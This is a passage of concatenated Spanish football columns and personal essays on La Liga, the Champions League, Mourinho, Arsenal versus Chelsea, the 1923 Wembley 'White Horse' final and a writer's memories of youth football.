y ha roto el partido, desusadamente en él, a base de zambombazos. El primero, típico de Senna, ha servido para homenajear al alma de España en la Eurocopa, que hoy se convertía en el jugador con más partidos en Primera de la historia del Villarreal. Ojalá jornadas como la de hoy se analicen en el exterior, pues prueban que la Liga es mucho más, para lo amantes del fútbol, que un combate singular. Lo maravillosamente cotidiano. Hace dos semanas escasas nos llevábamos todos las manos a la cabeza con la chilena decisiva de Baptista, y ayer Postiga, menos épico pero igual de estético, repitió suerte en escorzo genial para deleite de la Romareda. Quizá sea casualidad, pero tampoco podemos descartar la generación de una tendencia: el remate es efectivo, la gente aclama y los arietes se animan.Ya lo estamos viendo con el panenkazo, transformado cada vez más en un estándar –ver a Sergi Roberto ayer mismo-. En cualquier caso, hay que señalar el mérito de Helder, un ratón de área de esos que, entre menosprecio y menosprecio  a su falta de fútbol, ganan puntos, partidos y títulos.La reválida del Pipa. Tres hat-tricks casi consecutivos ponen el foco en cualquier futbolista, y mucho más si éste se llama Higuaín y todo el mundo percibe la competencia soterrada con Benzema. El Bernabéu le quiere, la crítica le aprecia y los números lo avalan, pero el ruido de fondo que siempre le acompaña no podrá silenciarse hasta que no decida como gran figura en un partido grande; y eso, para el Madrid actual, se llaman enfrentamientos con el Barcelona o rondas finales de la Copa de Europa. Ese es el salto final que le queda a Gonzalo, un desafío razonablemente justo que tuvo que salvar, con la camiseta blanca, hasta el mismísimo Ronaldo. Quizá en Old Trafford, también.La impronta de Caparrós. Resulta difícil imaginar dos personajes que llegasen al mismo sitio desde presupuestos tan diferentes. Laudrup era el futbolista maravilloso, el gentleman nórdico al que ellos admiran y ellas adoran, que allá donde fue dejó el trazo de caballero y la impronta de clase en los equipos que dirigió. Caparrós, en cambio, es el prototipoo del estajanovista, el tipo hecho a sí mismo desde las catacumbas del fútbol, que no tiene más nombre que el obtenido sudando cada banquillo, haciendo kilómetros y arrancando por lo civil o lo criminal hasta el último punto que sea posible obtener. Así ha comenzado su andadura en Mallorca, arañando el punto más clásico que hay, el de penalty (probablemente) injusto en el último minuto, y mostrando el camino a un equipo querido a quien su dirigencia condena a priori año tras año. De momento, merecieron empatar al hasta ahora irreprochable Valencia.El toque del croata. Apareció por esta página hace mucho tiempo, cuando era una joven promesa que había asombrado en el Basilea, y que llegaba al Schalke a comerse el mundo. Hubo un momento en que pareció perderse para el gran fútbol, en ese agujero de desmotivación que se ha tragado a tantos futbolistas de clase que desprecian lo tribunero. Sin embargo, Rakitic aterrizó de pie en un Sevilla en horas bajas, y en pocos meses ha adquirido los galones que merecen su visión de juego, sentido del ritmo y, sobre todo, su fantástica pierna derecha. Hoy es un mimbre fundamental en el mecano que está montando Marcelino –puesto de Champions a día de hoy- y no es casualidad que el segundo gol de ayer, el que certificó la victoria, saliera de sus botas. Una confirmación más de que no hay que ser un trotón para triunfar en el fútbol. La teoría de los multiversos es una propuesta tanto física como filosófica en la cual conviven algunos, muchos o todos los universos posibles en una misma realidad. Formulada a finales del siglo XIX, ha generado toneladas de literatura y ciencia, debates y polémicas, y constituye un fecundo campo de investigación en la actualidad. No podemos saber si es cierta, pero un día como hoy, con las semifinales de la Champions a horas vista, consuela un poco pensar que haya algo de verdad en el asunto, y que al menos cuatro versiones de nosotros mismos puedan disfrutar de las cuatro posibles finales. Cada una de ellas, de hecho, sería un universo en sí misma, así que viajemos un poco por los túneles espacio-temporales, sabiendo de antemano con lagrimilla en el ojo que disfrutaremos sólo una de ellas, y las otras tres quedarán aplazadas -al menos de momento- en el limbo del fútbol-ficción:Bayern-Atlético. Intentemos profundizar en la máxima humedad posible que pueda cobijar la ingle de un colchonero de pro. Aún resuenan los ecos del pasillo muere la prórroga y unos minutos antes Schweinsteiger ha colocado una falta en la escuadra de Courtois, tan perfecta que la ha celebrado antes de que entrase. Todo parece servido, cuando Godín agarra un balón perdido a 100 kilómetros de la frontal, suelta el zapatazo y conecta el servidor de pesadillas de Neuer para toda la vida. El asunto sólo puede concluir con 4-0 en los penaltis.Madrid-Mourinho. De un lado el equipo blanco, que lo fió todo a Mourinho, el gran entrenador y la personalidad atrayente, repugnante, divisoria y unificadora, todo a la vez, que monopolizó el club durante tres años cruciales, fracasó en la conquista del Grial, pero fue clave en la demolición de un barcelonismo guardiolista que amenazaba con una hegemonía a largo plazo en el fútbol europeo. Del otro, el hombre que nunca había entrenado un equipo de la magnitud del Madrid y que por primera vez dejó dudas y no se fue de un sitio cuando quiso; odiado, amado y único, por el público en general y el madridismo en particular, y que podría imposibilitar el objetivo por el que se dejó la piel durante tres años. Todo el morbo del mundo.Derby. Como diría el Sabio, “Se han dado hostias de todos los colores”. En Liga, en Copa de Alfonso XIII, en Copa del Generalísimo, en Copa de Europa, en Torneo Regional, en Copa de la Liga y ahora, quizá, en el gran partido. Su rivalidad asimétrica parte en dos la ciudad más que el liviano Manzanares que la atraviesa más cerca del sur. Cómo sería que las versiones maestras de ambos que disfrutamos en la actualidad acabasen jugándose la supremacía al borde de ese mismo río, convertido ya en un gigante y a punto de confrontar al mar.Su muy activa vida política no le impidió ser además una figura destacada en el mundo del deporte. Una desmesurada pasión por el turf le llevó a ser el dueño de una de las cuadras hípicas más importantes y laureadas de la época. Sus caballos fueron tres veces vencedores en el Derby, además de en otras grandes competiciones británicas, lo que le llevó a convertirse en uno de los propietarios de referencia.Pero no fueron solo las carreras de caballos. Lord Rosebery, activo impulsor del balón y promotor de torneos en el área de Edimburgo, fue Presidente Honorífico de la Scottish FA y apasionado seguidor de la selección escocesa de fútbol en unos años en los que las competiciones internacionales no pasaban de ser una simple anécdota. En reconocimiento a su trabajo, el equipo escocés decidió adoptar los colores de los jerséis que vestían los jockeys de la cuadra de Primrose, a franjas horizontales en colores rosa y mostaza. Ocurrió por primera vez en la década de los años ochenta del siglo XIX. Algunos años más tarde, y aún en vida del homenajeado, Escocia vistió la peculiar combinación en el British Home Championship, el torneo de selecciones nacionales más antiguo del planeta en el que las cuatro asociaciones de fútbol de las islas se disputaban anualmente el honor de ser la más fuerte del momento. Tuvo que pasar medio siglo hasta que el fútbol escocés recuperase los colores prestados por Primrose. Fue en la década de los años cuarenta, alargando su vigencia hasta el año 1954, justo antes del Campeonato del Mundo de Suiza. Sesenta años más tarde, Escocia decidió volver a homenajear a un personaje icónico y fundamental para el fútbol escocés en sus primeros envites internacionales. Tal vez impopular y muy probablemente estrambótico, el diseño de Adidas tenía una profunda raíz histórica.Puedes encontrar la camiseta escocesa inspirada en los colores de Lord Rosebery (y ahora a un precio especial), en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. No atraviesa José Mourinho la mejor situación posible. Quizá en el punto más delicado de su exitosa carrera como técnico de primerísimo nivel, el luso sobrevive en Fulham Road desde hace algunas semanas a una situación más que tensa. Su multimillonario equipo no carbura y su discurso parece ahora más agotado que nunca. Y en tal momento de pesadumbre, cuando su mandato y su autoridad parecen más cuestionados que nunca, un expupilo del estratega de Setúbal ha querido acordarse del que fuera su mentor en la temporada 2011/12. Actitud loable, ejemplo de fidelidad y seña de complicidad manifiesta. Pero el problema de Esteban Granero, quien ya no es un prometedor jovencito llamado a triunfar tarde o temprano sino un centrocampista menor empequeñecido por una interminable espiral de lesiones, es que ha llegado a ese peligroso punto en el que se habla más sobre su figura como activo Twittero que sobre sus evoluciones vestido de corto. Piensen en el tiempo que hace que no ven al ‘Pirata‘ brillar en un resumen, anotar un gol mágico o sentar cátedra a base de fútbol. Yo, sinceramente, ya no lo recuerdo.Porque con 28 años ya nadie espera que el centrocampista madrileño lidere un proyecto triunfal en un grande de Europa. Porque, en su tercer año como futbolista de la Real Sociedad, ha cruzado esa abrupta frontera que separa al fichaje ilusionante del elemento sospechoso anclado a la plantilla sin solución de futuro. Sí es cierto que, sin ser ni mucho menos un jugador determinante, fue uno de los fijos para David Moyes durante el pasado curso, pero tampoco es una referencia excesivamente elogiosa para un equipo que nadaba en la mediocridad. Se esperaba que jugadores como él rescataran al cuadro donostiarra de su triste deambular por zona de nadie y lo redimensionaran hasta convertirlo en candidato a logros mayores.Tenía especial predilección por el Granero futbolista de hace algunos años. Me parece anodino e intrascendente el actual Granero Twittero, por mucho ruido social que generen sus intervenciones más sonadas en la red. Hubiese pagado dinero por ver jugar al primero y, como dato esclarecedor, ni tan siquiera sigo en Twitter al segundo. Cuatro semifinales consecutivas. Con más sufrimiento del esperado tras los noventa minutos del Bernabéu, el Real Madrid consiguió anoche su cuarta clasificación consecutiva para unos cuartos de final de la Liga de Campeones. De tanto repetirse, el éxito y lo extraordinario ha terminado convirtiéndose en costumbre y obligación.Cuando hablamos de Lady Gaga hablamos de un todo, de un universo complejo pero humano. No es una cantante, ni siquiera una show-woman, Lady Gaga es un acontecimiento andante. Mourinho es el Lady Gaga del fútbol. Desde que llegó a Madrid él es quien marca la actualidad de una prensa que asiste a su performance entre el ensimismamiento y el rencor. Dan igual los sistemas, los onces, las derrotas, las victorias, dan igual las metas de final de temporada, los descartes, los fichajes, la frecuencia de las lesiones, la utilización de la cantera. Da igual todo salvo Mourinho, su presencia es la noticia. No es el entrenador del Madrid, no, el Madrid es sólo un club al que entrena ese ciclópeo fenómeno conocido en los tabloides como Mou.Esta noche juega el Real Madrid en Santander. La noticia podría ser la vuelta de Canales, incluso la de Garay. El año pasado a lo mejor se hablaría de Munitis por su vinculación merengue. Podríamos hablar de fútbol, de sistemas, de ausencias.Pero de nuevo seguimos con el entrenador como un agujero negro de la información. Hoy es Carlin, en El País, por poner un ejemplo. El interés es un músculo fofo y no todos tenemos que desear saber el once que presenta Marcelino para frenar el empuje blanco. Curioso el fenómeno maniqueo que arrastra el entrenador portugués, cómo ha conseguido dividir las pasiones, cómo es defendido a ultranza o criticado hasta el insulto siendo sólo el instrumento de un club. No recuerdo semejante seguimiento desde el celebérrimo discurrir de Van Gaal en Barcelona. Jamás un técnico tuvo tanta repercusión en una prensa que vive más pendiente de los rifirrafes institucionales, de los plantes y las malas palabras que del juego desplegado por un Madrid que lleva dos años tratando de dar caza al Barcelona y que no ha hecho nada más que arañarlo levemente. Cómo esas patatas se han comido al solomillo, que diría Lillo. El rendimiento de Benzema es importante en la medida en que Mourinho motiva o desmotiva al francés, los refuerzos de invierno son importantes en función de la opinión del entrenador, las polémicas con Valdano, las palabras a Pedro León, el plante en la rueda de prensa previa al Auxerre. Todas las noticias generadas por el gigante futbolístico pasan por las manos y el cerebro de Mourinho.Puede ser una táctica, puede ser una estrategia para aislar al grupo, puede ser un plan perfectamente urdido por el portugués para minar la moral de los contrarios, o puede ser, como yo creo,  un descoque absoluto entre afición, club y prensa en el que el fútbol ha pasado a un segundo plano para dejar paso a los arrrgs, a los off the record y a todos esos temas que tan ajenos son al fútbol como los vestidos de Lady Gaga lo son a la composición y la armonía. Esta noche, a las nueve y fuera de casa, el Madrid tiene que vencer a un Racing que tras la sustitución de Portugal ha encontrado algo más de equilibrio y pegada. De ello depende seguir vivo en la liga. Es un partido de fútbol, sí, pero muchos aficionados, mucha prensa, muchos opinadores han decidido mudarse del centro de la ciudad a los alrededores. Han apartado la carne y han sucumbido al regusto aceitoso e instantáneo de la guarnición. Mis padres me quitaron del fútbol en el 96. Estudiaba 3º de BUP y me habían quedado cuatro asignaturas para septiembre: Latín, Inglés, Matemáticas y Física y Química. Esta última además con un Muy Deficiente porque mi profesora, Elena Kindelán, me había pillado con un post-it garabateado de fórmulas que escondía adherido al pupitre donde me examinaba.Por entonces era titular del A.D. Miralbaida, el equipo de mi barrio. Me había ganado ser un fijo del once dejándome la piel, literalmente, en el campo de tierra que aparecía, como un desierto instantáneo, enfrente de mi casa. Acabamos la Liga segundos tras un gran campeonato e íbamos a empezar la Copa. Se nos escapó el torneo de la regularidad en el último minuto, en casa, ante los vecinos de Las Palmeras, que vestían como el Dortmund. Su portero, un chaval bajito y gordo, hizo un partido inolvidable. Yo, sin embargo, fallé en el último minuto a la salida de un córner propiciando el 3-4 que les dio la victoria y el campeonato. Nos valía empatar, como siempre en la vida.Mis compañeros se acercaron a mí y me dijeron “no pasa nada” y así contuve las lágrimas. Había sido un año duro y lo había dado todo. El entrenador, tras el partido, me pasó el brazo por el hombro. Lo sentí como un yugo de culpa. Caminé como un buey hasta el vestuario, resoplando y humillado con el enorme peso del míster sobre la espalda. “Has dado más puntos al equipo que los que le has quitado, así que vete tranquilo. La Copa la vamos a ganar y tú vas a ser el mejor”. Me sacó una sonrisa. Me duché pensando en el futuro.El futuro no llegó. Nunca jugué ese partido. Ni ningún otro. Cuando mis padres me dijeron que no seguía, el entrenador vino a mi casa, pero ya no hubo nada que hacer. Me metí en el cuarto y pasé días con un nudo espinoso en la garganta. Cambié los guantes y las botas por una academia de verano donde estudiar declinaciones, integrales y toda esa mierda que de nada me ha servido más en mi vida. Aprobé todo. Me esperaba COU, pero mis padres me dijeron que ya no volviera al fútbol. Que estudiara.Que después vendría la Selectividad, y la carrera y que eso ya no era tan fácil. Que me centrara.Aprobé Selectividad pero nunca terminé la carrera. Tampoco volví a jugar al fútbol. Sólo esas pachangas de domingo, con amigos, con césped artificial, con cervezas en el tercer tiempo. Pero yo a eso no lo llamo fútbol. Fútbol es fallar en un córner y que el cielo se rompa sobre tu cabeza como un espejo en el suelo. Fútbol es que los goles se celebren de una forma irracional. Que te insulten los aficionados visitantes. Que luzcas orgulloso el chándal del equipo en el Instituto. Todos esos recuerdos que se amontonan en el lagrimal, ese músculo elongado al que llamamos nostalgia.Hoy soñé con aquel partido de fútbol que nos costó la Liga. Volvía a fallar. Mis compañeros se acercaban a mí, con sus camisetas rojiblancas amarilleadas por el albero. Pero esta vez no me animaban, no me levantaban del suelo y me daban palmadas en la espalda. Esta vez se acercaban a mí y los rivales tenían que detenerlos. Uno me agarraba de la camiseta a la altura del pecho. “Hijo de puta” me dijo mi mejor amigo en el vestuario, un central muy negro y espigado que admiraba a Juanma López y lo imitaba en los partidos de casa. Borja, nuestro delantero estrella y que acabó de pichichi en esa temporada, me dijo: “Hemos perdido por tu culpa, por tu puta culpa”. Me desperté dando bocanadas como un pez orillado. Me costaba respirar. Abracé a María pero no le conté nada. Me refugié en su plácido sueño. Esta mañana pensé en que la vida es ese partido. El mismo miedo al error. Pero aquí ya no me abraza un vestuario. Aquí ya no me anima el entrenador. Estoy solo, bajo los palos, después de haberme equivocado. El mismo cansancio, las mismas carnosas heridas al frotar los muslos contra la arena áspera de la infancia.Así que vivir era esto, salir por alto en un córner y tratar de agarrar un balón que apenas ves. Sobre la presencia enemiga, alzándote entre futbolistas que no quieren que alcances ese balón. Que quieren que falles, que no celebres nada, que sobrevivas arrodillado en una esquina del campo maldiciendo los errores. Sin mirar más arriba. Ese balón que se escapa, ese fallo que te condena a la tierra y a un laberinto en el estómago, el de los nervios y el miedo.Eso aprendí. Que no hay partido de Copa donde redimir los errores. Lo aprendí con 16 años. Lo he aprendido hoy. “Todas las decisiones tienen sus consecuencias”, dijo mi madre. Creo que ya la he perdonado por haberme quitado del fútbol cuando más feliz era. Aprendí, de golpe, de qué va todo esto. A qué nos exponemos cuando salimos al campo. Al campo que es vivir, siempre con los pantalones zurcidos y los tacos desgastados. Habíamos quedado para ver el fútbol pero acabamos hablando de nuestras miserias. Miseria es una palabra con dos puntas. Es miserable el que no tiene dinero, el que vive apretado contra la realidad, el que hurga en la cartera y refresca la pantalla buscando su última nómina, el que calcula el precio de las cosas, el que tiene que decir “no” al capricho de sus hijos, el que come en casa y ve el fútbol donde puede. Es miserable también el que lo permite, el que trampea con los contratos, el que elige a los allegados y no a los que han demostrado su valía, el que monta un tinglado sin mirar más allá de su productividad, el de los vicios caros, el que trata a los trabajadores como a pollos de granja, como a animales descontextualizados sin más mundo que su oficio, sin más obligaciones que ir cada mañana a sacarle las castañas del fuego. Miserables son los de abajo y los de arriba. “En tiempo de revolución, la miseria es a la vez causa y efecto”, escribía Víctor Hugo.Nuestros equipos iban perdiendo pero era lo de menos. Hablábamos de ese otro mundo que no es el fútbol, aunque también nos obligue a llevar espinilleras y botas de taco metálico. A la vida, al tackle cotidiano. A esos árbitros que en la vida nos pitan en contra. Ayer éramos Kahn sentado sobre el césped del Camp Nou tras el último gol de Solskjær, éramos David Luiz tras el 7-1 de Alemania, éramos el desconsuelo de Cañizares y Raúl lanzando al cielo un penalti contra Francia. Unos habían perdido el trabajo, otros descubrían que llevaban meses con un contrato que no se ajustaba a la realidad, a otros le habían bajado el sueldo para poder contratar así al primo inútil de su jefe.El fútbol nos ha enseñado que el talento condiciona, pero no determina. Que hay tentáculos oscuros en cada estrato de nuestra sociedad. Dan igual los méritos y las ilusiones, siempre hay alguien peor que puede convertir tu vida en un espacio irrespirable.Guardiola-Mourinho. No sé si habrán visto Los duelistas, una de las películas menos conocidas y a la vez mejores de Ridley Scott: un Harvey Keitel con los pelos como Slash y el hermano Carradine con la mayor cara de loco de la familia se enfrentan en un duelo que queda inconcluso y se prolongará, una vez tras otra, indefinido y casi interminable, a lo largo de décadas. Así hasta que llega el día del momento definitivo, su final de la Copa de Europa particular, y esa rueda de prensa después del partido, ese lugar donde tan grandes se han hecho ambos, y para escuchar decir al ganador: “Por las reglas del combate, desde este momento tu vida me pertenece. Te declaro muerto; estoy en mi derecho de no darte muerte física. A si pues, actúa como un hombre muerto.” Es difícil reflejar con tanta concisión y de modo tan lapidario lo que muchos aficionados pensamos del partido del otro día, en particular, y sobre todo de lo que han sido los dos equipos de Londres en estos años, en general. El Arsenal es el equipo chic por excelencia de la Premier, el disfrute máximo de los estetas del balompié que valoran por encima de todo el fútbol combinativo, el toque de balón y la posesión, por mucho que en ocasiones se caiga en la intrascendencia y una cierta melancolía muy particular. Imaginamos a Wenger cual una suerte de Scott Fitzgerald alsaciano, levantando un proyecto romántico de indudable mérito a base de jóvenes tan talentosos como etéreos, a la vez que recuerda con nostalgia cuando, menos talibán de su idea, construyó un equipo ganador que poco a poco sólo recordamos los más viejos del lugar. Uno mira a Van Persie, a Rosicky o a Arshavin y lo que se viene a la cabeza es e una delicada copa de cristal de Bohemia, los últimos acordes del concierto para piano de Grieg o una estancia vacía, nacarada y neblinosa en las profundidades de Versalles. La belleza del hielo. Algo hay de verdad en los que le encuentran parecido al Barcelona del dulce Iniesta y el toque perpetuo de Xavi; el Barça que hipnotiza y se gusta, que dibuja suave geometría y provoca suspiros entre las legiones de sibaritas que admiran la perfección de una pelota moviéndose suavemente, mecida, dominada por la voluntad y la técnica. Es otra percepción la que provoca el Chelsea, sin duda. Sin más concesión estética que el precioso azul de su zamarra, lo que evoca la imagen de los Essien, Obi Mikel, Malouda o Drogba es la carga de la brigada ligera al ritmo de la batería salvaje de The Trooper, las patas de los caballos pisando cañones, los guerreros entregados al frenesí y los estampidos por doquier sembrando el campo de sangre y fuego. A los blues los entrena Ancelotti y antes lo hicieron Grant y Hiddink, pero lo que se percibe en su afilada verticalidad, en su voluntad de victoria y en el poderío de sus futbolistas es la impronta indeleble de Mourinho. No podemos estar más en desacuerdo con nuestro admirado Martí Perarnau, pues las virtudes que adornan a esta máquina, las que han sumado ligas casi sin cuento y han convertido Stamford Bridge en el Alcázar de Toledo, son las que inculcó el portugués a una escuadra a la que no ha hecho falta la orejona para sembrar el temor entre los adversarios. ¿Quién querría tenerlos enfrente en un semifinal europea? Ni siquiera el Barcelona, que ha sufrido más que nadie el binomio letal Chelsea/Mou. Y no hace falta recurrir al tópico de extremos que se tocan para apreciar cuánto une a las dos escuadras, una semejanza quizá no superficial, pero tan real o más como la que mencionábamos antes: el hambre de Essien es el hambre de Alves, no desentonaría el mejor Messi en el juego punzante de los británicos, Piqué es un Terry evolucionado, y pocos equipos poseen tal capacidad de presionar al rival hasta convertir el partido en un infierno y han conservado durante tantos años esa Wille zu macht de la que habló Nietzsche. El Barcelona que, directo e incontenible, ha ganado un título detrás de otro, es el que se parece a los de King’s Road. El que gana, y gana, y gana, y vuelve a ganar.Fitzgerald o Hemingway. Chopin o Iron Maiden. Estética o victoria. Bonito o bueno. Arsenal y Chelsea. …mucho antes de que el impersonal mamotreto de Norman Foster ocupase el solar del único campo que podría disputarle con razón a San Mamés el título de catedral. Sí, de acuerdo, es moderno y enorme, cinco o seis estrellas de la UEFA, qué mas da. Se sigue reservando para los grandes momentos, y sólo para ellos, ningún club puede reclamarlo como propio. Y el arco impacta por tamaño, y se distingue en lontananza desde muy, muy lejos, como una puerta de entrada a un impoluto siglo XXI de metales y tecnología. Pero la gran experiencia, la de bajarte del metro y contemplar el viejo coloso y las torres gemelas que no por casualidad recordaban un templo, se fue para siempre. Al menos, queda el pasillo que allí lleva, el White Horse Bridge, ye eso hablaremos hoy. Del caballo.Fue en 1923, cuando el viejo Wembley, recién inaugurado, respondía aún flamante al nombre del Estadio del Imperio Británico, y era el campo más grande del mundo. No había ni Mundiales, y aunque la Copa inglesa se dirigía ya a su edición número 48, nadie en las altas esferas pensaba que pudieran llenarse las más de cien mil localidades del nuevo coliseo; máxime si los oponentes eran el Bolton –que está muy lejos de Londres- y un West Ham que penaba en Segunda, exactamente como lo hará la próxima temporada. De hecho, por la mente de las autoridades vagaba una sombra de gradas vacías, el fantasma de un estadio desierto, lóbrego e impersonal, vacío como el estómago de una vaca en la Antártida. Como dice Galeano, nada hay más triste que las gradas sin nadie. Ni más vergonzoso, con el Rey en el palco.No podía ser, así que se decidió no pedir entrada, abrir las puertas del campo –nunca mejor dicho- y que viniese quien quisiera. Ahora ya todos sabemos de las consecuencias que produce minusvalorar el poder del fútbol como fenómeno de masas, pero es dudoso que pudieran calibrarlo aquellos optimistas políticos de entreguerras. Como no podía ser de otra manera, la gente acudió a Wembley, y no fueron uno ni dos, ni cien ni mil. Si acudió en turbión la hinchada trotter, qué podía esperarse de los hammers, que sólo tenían que cruzar la ciudad de este a norte. En medio del ambiente festivo, ríos de multitudes se acercaban al recinto, que dos horas antes del comienzo del match presentaba ya unas gradas repletas. Se dio orden a la policía de que cerrase las puertas, pero la los aficionados las reventaron con total tranquilidad, apartaron al bobby más cercano y siguieron entrando. A la hora del partido, la estimación es que había 250.000 personas allí dentro, que ocupaban gradas, pasillos, corredores, baños y techos; de hecho, el césped tenía tanta gente encima que hubiera podido cambiar su color a amarillo limón sin que nadie se hubiera enterado. No es que no se pudiese empezar a jugar, es que allí podía pasar cualquier cosa. Hasta que llegaron George y Billie.Sentado tranquilamente en el salón de su casa, George Scorey seguramente pensaba en un tranquilo fin de semana cuando recibió la llamada. No estaba de servicio ese día, pero  las cosas en Wembley se estaban poniendo feas, y la Policía Metropolitana necesitaba todo el personal disponible. Así que George se puso el uniforme, embridó a Billie y marchó hacia el estadio. De algún modo, y no fue esta su menor hazaña del día, consiguió abrirse paso por el mar de cabezas del exterior y penetró en el estadio. Una vez dentro, se las arregló para poder colocarse en el mismo círculo central; sin duda le ayudó el color de su compinche, un gris claro que en medio de la multitud, parecía tan blanco como Sombragrís. Es en este momento cuando la historia y la leyenda se confunden, quizá porque lo real tiende a lo legendario para darse importancia, o porque este mito goza de la plausibilidad y la verosimilitud de las grandes historias. Sea como fuere, parece ser que Billie empezó a trotar en círculos concéntricos cada vez más grandes, mientras su jinete gritaba a los que le rodeaban para que entrelazasen sus manos y fueran retrocediendo. Lentamente, inexorable pero dócil, mansa como la marea que se retira de la orilla, la multitud se fue retirando, hasta que acabó situándose justo detrás de las líneas de cal.Como si de repente, de un plumazo, se hubiesen olvidado la retahíla de eliminaciones tempranas de antaño, los goles in extremis de Zalayeta, las cabalgadas imposibles de Henry por la banda del Bernabéu o los chorreos en Anfield. Casos insólitos, desde luego. No era normal que un equipo del tallaje del Madrid cayese durante seis penosos años en octavos de final, como tampoco puede considerarse como algo ‘normal’ que alcance las semifinales del torneo durante, de momento, cuatro años consecutivos.Un error que pudo ser fatal. Hubo quien quiso dar la eliminatoria ante el Borussia Dortmund por finiquitada antes de tiempo, y el Madrid a punto estuvo de pagar el precio de vivir en esa arriesgada mentira que pretende hacer creer al madridismo en la invencibilidad de su equipo. Como si una derrota fuese algo inconcebible. Durante cincuenta minutos, el Madrid estuvo a un gol de haber tenido que disputar una prórroga bajo el asfixiante espesor del manto amarillo. Ni siquiera de haber sido eliminado, no, simplemente de haber tenido que jugar treinta minutos extra. Por momentos, por las reacciones vividas y por las sensaciones percibidas, pareció que el 2-0 eliminaba al Real Madrid. En lugar de asimilar un pésimo arranque de partido y tratar de redireccionar esfuerzos para asir la eliminatoria con fuerza especulando con su exigua ventaja, el Madrid se dedicó a hacer cabriolas sobre el alambre, entre alucinado e incrédulo, cuando vio peligrar su pase. Se creyó intocable, pero no lo era y a punto estuvo de caer presa del pánico.De frente con Casillas. Algo tóxico sobrevuela la figura de Iker Casillas desde tiempo atrás. Tanto es así, que ha llegado un punto en el que ensalzar los méritos (merecidos) del capitán blanco se convierte en tema de burla recurrente partido tras partido. Casillas, así como Diego López, se han convertido en las ridículas armas arrojadizas de dos facciones torpemente enfrentadas en perjuicio de la integridad del club. Se banalizan sus méritos al mismo tiempo que se loan exageradamente sus actuaciones de mero trámite. Y él, mientras tanto, se mantiene en medio del fuego cruzado, aparentemente inmune a las críticas desmedidas y carentes ya de argumentos deportivos, respondiendo a las exigencias con la misma naturalidad de siempre, sin aspavientos. Me cuesta creer que, a día de hoy, haya un motivo estrictamente deportivo que mantenga a Diego como habitual titular en la meta madridista. Si ayer el Madrid no se fue a la prórroga fue por la actuación de su portero. Y no debería haber ningún miramiento en reconocerlo abiertamente.Templando con Casemiro. Once balones perdidos por Ángel Di María a lo largo de los minutos que el argentino permaneció sobre el césped de Dortmund son argumento más que suficiente para subrayar el delicado papel del Fideo anoche. Alejado de esa posición de interior que tanta solidez había dado al 4-3-3 de Ancelotti en los últimos meses, Di María se vio perdido en una zona del campo en la que ni creaba peligro ni ayudaba a Xabi e Illarramendi, continuamente sobrepasados por el centro del campo alemán. En mitad de la carga de los Rohirrim, Carlo vio la solución a sus espaldas. Mandó a Casemiro despojarse del chándal y, tras una temporada prácticamente en blanco, le dijo que saliese al campo y que tuviera ‘fuerza y confianza‘. La misma confianza que él llevaba denegándole varios meses. El brasileño respondió con creces esta vez. Dio consistencia al Madrid e insufló oxígeno a la medular cuando los blancos ya se preparaban para atrincherarse en torno a su área. Con pequeñas victorias como la de Casemiro anoche se ganan las grandes batallas. España derrotó a Italia (1-0) en el antepenúltimo partido de preparación con vistas al Mundial del próximo mes de junio, recuperando así, en el mejor momento, una sensación de confianza y serenidad que parecía haberse perdido tras el doble amistoso disputado en suelo africano. Recuperar las buenas sensaciones, ante un rival con consistencia, era primordial de cara a afrontar la recta final de la preparación mundialista en un clima sosegado y acorde con el espíritu del seleccionador nacional. Llamaba la atención en la previa del partido la esperadísima incorporación de Diego Costa al equipo. Tras varios meses de postulaciones, polémicas varias, gestos de compromiso y oportunidades perdidas llegó el día del bautismo del hispano-brasileño. El ensamblaje del delantero del Atlético de Madrid en el esquema del combinado nacional despierta dudas, por condiciones, por estilo y por carácter. Cuesta imaginar al volcán colchonero ejerciendo el papel de novato dentro de un grupo ya hecho. Es un rol en el que no se desenvuelve bien, porque su máximo rendimiento lo obtiene cuando ejerce como centro gravitacional, no cuando es una pieza más pendiente de ser acoplada al equipo. Quizá por eso ayer se vio a un Diego fajador y peleón, sí, pero minimizado con respecto a su versión liguera. Tímido en la participación e inseguro en el control, el nuevo delantero del combinado nacional aún no ha adaptado su juego al de la selección de Del Bosque. Aparece como un elemento extraño, todavía ajeno al vertiginoso ritmo de pase-pase-pase que imponen en la zona de tres cuartos de campo los pequeños. El software que Costa trae preinstalado no lee aún los archivos del juego de la selección porque precisa de un par de actualizaciones y las dudas sobre su rendimiento no terminan de evaporarse del todo.Por encima del discreto papel de Costa, España dejó anoche sobre la mesa dos ilusionantes realidades. Por un lado, la (parece definitiva) posición de Javi Martínez en el centro de la defensa. Ayer compañero de Sergio Ramos por la ausencia de Piqué, el antaño mediocentro navarro interpreta cada vez mejor su nueva ubicación en el campo. Recuerda en cierto sentido al camino que tuvo que recorrer en su momento Fernando Hierro, de centrocampista con descomunal llegada y enorme despliegue físico en sus inicios a central de inmejorable colocación y envidiable capacidad para iniciar el juego. Hay quien considera que es una pena perder el imponente físico de Javi en una zona, el centro del campo, en la que podría extraérsele mucho más partido, pero donde no nos sobran futbolistas es en el eje de la zaga, no en el medio centro. Ayer no cometió el del Bayern ningún error. Entre él y Ramos sujetaron a Osvaldo en la primera mitad y cuando, ya en la recta final del partido, se vio exigido por el fresco Immobile, respondió con la misma solvencia de siempre. No me parece descabellado pensar que pudiera llegar a ser uno de los centrales titulares de cara al Mundial.La segunda pieza a destacar es el asentamiento definitivo de Thiago Alcántara. Por lo visto anoche, Del Bosque parece decidido a volcar sus esperanzas en él, como en su día Aragonés las volcó sobre Xavi. No solo disputó los noventa minutos del choque, sino que permaneció activo y clarividente hasta el último minuto.Grecia ganó una Eurocopa y Lothar Matthäus nunca levantó la Copa de Europa. Apurábamos la cerveza y ya apenas mirábamos la pantalla. El Numancia empataba el partido, el Villarreal plantaba cara al Barcelona y el Sevilla fallaba un penalti. Era lo de menos. Estábamos entretenidos en despellejar a nuestros jefes, en insultar a nuestros iguales, a eso tan humano de desahogarse entre amigos con las jarras de cerveza vacías amontonadas sobre la mesa de madera escarbada por otros que se desahogaron antes que nosotros.La vida es una huelga de basura constante. Miré la clasificación en casa y el empate del Córdoba no era tan malo. Busqué los equipos de mis amigos: uno aún se mantenía en puestos de playoff, el otro seguía con opciones de jugar en Europa, el otro había logrado salir del descenso. Me alegré por ellos clandestinamente. Pensé que quizá mañana cuando se levantasen, se encontrarían con la sorpresa tras una tarde en la que el fútbol fue lo menos importante. Odiar el mundo es un acto de legítima defensa. Estamos rodeados de miserables. Los que no tienen y los que tienen demasiado. Los que no saben y los que saben demasiado. “La temporada es muy larga” dijo uno de mis amigos y nos 